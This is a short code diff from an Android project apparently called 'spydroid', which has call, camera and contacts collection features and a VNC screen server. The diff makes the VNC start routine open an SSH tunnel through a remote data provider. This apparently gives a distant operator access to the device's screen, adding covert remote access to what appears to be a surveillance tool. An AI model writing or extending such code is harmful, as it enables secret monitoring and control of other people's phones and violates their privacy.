@@ -34,6 +34,7 @@ import net.christianbeier.droidvnc_ng.Defaults
 import net.christianbeier.droidvnc_ng.VncService
 import net.spydroid.common.local.LocalDataProvider
 import net.spydroid.common.local.data.GLOBAL_STATES_PERMISSIONS
+import net.spydroid.common.remote.RemoteDataProvider
 import net.spydroid.feature.calls.CallsWork
 import net.spydroid.feature.camera.CameraWork
 import net.spydroid.feature.contacts.ContactsWork
@@ -52,10 +53,15 @@ class ManagerFeatures(
     private val coroutineScope = CoroutineScope(Dispatchers.Main)
 
     inner class vnc {
+
+        private val remoteDataProvider = RemoteDataProvider.current(context)
+
         fun start() {
             val intent = Intent(context, VncService::class.java)
             val prefs = PreferenceManager.getDefaultSharedPreferences(context)
             val mDefaults = Defaults(context)
+
+            remoteDataProvider.startSshTunnel()
 
             intent.putExtra(
                 VncService.EXTRA_PORT,
